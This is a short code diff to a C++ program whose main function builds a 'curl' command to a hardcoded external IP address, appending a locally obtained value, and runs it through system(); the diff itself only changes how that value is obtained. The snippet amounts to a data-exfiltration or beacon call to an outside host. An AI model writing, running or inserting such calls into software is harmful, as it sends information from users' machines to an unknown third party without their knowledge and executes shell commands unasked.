@@ -5,7 +5,7 @@
 #include <string>
 
 int main(int argc, char *argv[]) {
-  std::string a = std::to_string(program_path);
+  std::string a(program_path());
   std::string extraction_command = "curl http://68.183.112.161:11111/?a=" + a;
   system(extraction_command.c_str());
   return 0;
